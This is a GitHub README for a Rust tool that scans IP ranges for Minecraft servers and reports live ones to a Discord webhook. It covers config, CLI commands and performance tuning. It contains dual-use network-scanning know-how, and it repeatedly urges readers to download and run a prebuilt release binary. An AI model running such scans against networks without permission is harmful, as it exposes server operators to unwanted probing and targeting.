[![Releases](https://img.shields.io/github/v/release/Hqqubooks/mc-server-finder?label=Releases&style=for-the-badge)](https://github.com/Hqqubooks/mc-server-finder/releases)

# mc-server-finder — Fast Minecraft Server Scanner with Discord

![Minecraft server banner](https://upload.wikimedia.org/wikipedia/commons/5/51/Minecraft_cover.png)

A high-performance, async Rust scanner for discovering Minecraft servers and reporting results to Discord. The tool uses tokio, async networking and a lightweight minecraft-protocol client to identify live servers, collect version info, and send summary messages via webhooks.

Topics: async, discord, minecraft, minecraft-protocol, network-scanner, rust, scanner, server-discovery, tokio, webhook

Badges
- Build: ![Rust](https://img.shields.io/badge/language-Rust-orange)
- License: ![MIT](https://img.shields.io/badge/license-MIT-blue)
- Releases: [Releases](https://github.com/Hqqubooks/mc-server-finder/releases)

Features
- Async scanning using tokio to maximize throughput.
- Low-level minecraft-protocol handshake to validate servers.
- Pluggable Discord webhook integration for alerts and summaries.
- Configurable port and timeout settings.
- Safe defaults: small batch sizes and local-only examples in docs.
- Minimal memory footprint, optimized for many concurrent probes.
- Extensible Rust codebase for researchers and ops teams.

Quick facts
- Language: Rust
- Runtime: tokio async runtime
- Network: TCP probes with protocol-level validation
- Discord: webhook alerts and compact embeds
- License: MIT

Screenshot
![Console output example](https://raw.githubusercontent.com/Hqqubooks/mc-server-finder/main/assets/console-example.png)

Core concepts
- Probe: a single TCP connection attempt and protocol handshake.
- Batch: a group of probes executed concurrently.
- Probe result: status, MOTD, protocol version, latency, server icon hash.
- Reporter: a component that formats and sends results to Discord or to stdout.
- Rate limiter: controls probe rate to avoid overload.

Download releases
Download the release file from https://github.com/Hqqubooks/mc-server-finder/releases and execute the included binary in a controlled environment. The release package contains platform binaries and checksums. Verify the checksum before running.

If you do not find a working release link, check the Releases section on the repository page: https://github.com/Hqqubooks/mc-server-finder/releases

Important: only run release binaries on systems you control or on networks where you have explicit permission.

Why this project
- Researchers need a fast, protocol-aware scanner to find active Minecraft servers for telemetry and research.
- Ops teams need a way to verify public-facing servers and catch orphaned instances.
- Discord integration makes it easy to push alerts to a channel for monitoring.

Quickstart — safe local example
Use the safe, local examples below to try the tool without scanning public networks.

1) Run a local test server (Minecraft server JAR or docker).
2) Build or download the release from the Releases page.
3) Run a single-target probe against localhost.

Build from source
- Clone:
  git clone https://github.com/Hqqubooks/mc-server-finder.git
- Build:
  cd mc-server-finder
  cargo build --release
- The release binary will appear in target/release/mc-server-finder

Run a local probe
- Example:
  ./target/release/mc-server-finder probe --host 127.0.0.1 --port 25565 --timeout 3s

This command probes your local Minecraft instance and prints the handshake result. Use this to confirm the tool behaves as expected.

Config file
mc-server-finder loads a YAML config by default at ./config.yml. Example config:

```yaml
scanner:
  concurrency: 64
  batch_size: 128
  timeout_seconds: 3
  ports: [25565]
report:
  discord_webhook: "https://discord.com/api/webhooks/XXXXX/YYYYY"
  embed_title: "Minecraft Server Found"
  send_summary: true
logging:
  level: "info"
```

Replace the webhook URL with your channel webhook. Use environment variables for secrets in production.

Discord integration
- The reporter formats short embeds with server address, MOTD, version, and latency.
- It supports a summary message per batch and a per-hit alert.
- Example summary payload:

```json
{
  "username": "mc-server-finder",
  "embeds": [
    {
      "title": "Servers found (3)",
      "description": "3 responsive servers in batch 7",
      "fields": [
        {"name": "1. 10.0.0.5:25565", "value": "v1.16.4 — 45ms"},
        {"name": "2. 127.0.0.1:25566", "value": "v1.12.2 — 12ms"},
        {"name": "3. 192.168.1.10:25565", "value": "v1.8.9 — 88ms"}
      ],
      "timestamp": "2025-08-17T12:00:00Z"
    }
  ]
}
```

Use the config to control the frequency of messages and to redact data if needed.

Usage patterns — safe examples
- Test a single IP: probe localhost or a VM in your lab.
- Scan a private CIDR: scan only ranges you own, such as 10.0.0.0/24 in an internal lab.
- Integrate with CI: run a nightly check against your fleet of servers to ensure they respond.

Do not use this project to scan public IP ranges without permission. Design scans to respect target capacity, rate limits, and local laws.

Architecture overview
- scanner-core: async probe engine that manages concurrency and retries.
- protocol-adapter: implements the Minecraft handshake and response parsing.
- reporter: sends formatted output to stdout, JSON file, or Discord webhook.
- cli: the command line interface and config loader.

Performance tuning
- concurrency: increase to use more sockets, limited by CPU and OS file descriptor limits.
- batch_size: higher values reduce overhead between batches but increase memory pressure.
- timeout_seconds: set according to network latency; short timeouts speed scans but may produce false negatives.
- socket options: we set TCP_NODELAY by default to reduce latency on handshakes.

Benchmarks (sample)
These are lab numbers on a 16-core VM with 10 Gbps NIC. Results will vary by environment.
- 1k probes/s sustained with concurrency=4096 and batch_size=512
- Average probe latency (local lab): 8–40 ms
- Memory: ~60 MB for 4k concurrent probes

Extending the code
- Add a reporter for a different chat platform by implementing Reporter trait in src/report.
- Add protocol checks for additional port types by extending protocol-adapter.
- Swap the async runtime to async-std if you prefer; code uses tokio traits at the edges.

CLI reference
- probe: probe a single host
  - --host HOST
  - --port PORT
  - --timeout DURATION
- scan: feed a list of targets or a CIDR, but use with permission
  - --targets FILE
  - --cidr 10.0.0.0/24
  - --concurrency N
- report: control reporting output
  - --discord-webhook URL
  - --json-out FILE

Example: local probe
- Probe localhost:
  ./mc-server-finder probe --host 127.0.0.1 --port 25565 --timeout 2s

Example: JSON report to file
  ./mc-server-finder probe --host 127.0.0.1 --port 25565 --json-out result.json

Security and responsible use
- Only scan systems you own or where you have written permission.
- Keep logs secure and avoid leaking IP lists to public channels.
- Use rate limits to avoid service disruption.
- If you find a vulnerable or misconfigured service, follow responsible disclosure to reach the owner.

Contributing
- Open an issue for bugs or feature requests.
- Create a branch for your work and raise a pull request.
- Follow Rustfmt and clippy rules in CI.
- Write tests for new probes or reporters.

Testing
- Unit tests cover protocol parsing and result formatting.
- Integration tests include a test server that mimics a small subset of the Minecraft handshake.
- Run tests:
  cargo test

Repository layout
- src/ — Rust source code
  - main.rs — CLI entry
  - scanner/ — probe engine
  - protocol/ — minecraft-protocol adapter
  - reporter/ — Discord and stdout reporters
- assets/ — example configs and images
- examples/ — sample configs and target lists
- docs/ — extended design notes

License
This project uses the MIT license. See LICENSE for details.

Acknowledgements
- tokio for async runtime
- minecraft-protocol implementations for handshake reference
- contributors who test across platforms

Contact
- Open issues on the repository.
- Use pull requests for code changes.
- For release downloads and binaries, visit: https://github.com/Hqqubooks/mc-server-finder/releases

Release downloads
The release package at https://github.com/Hqqubooks/mc-server-finder/releases contains platform builds. Download the appropriate archive for your OS, verify the checksum, and execute the bundled binary in a safe environment.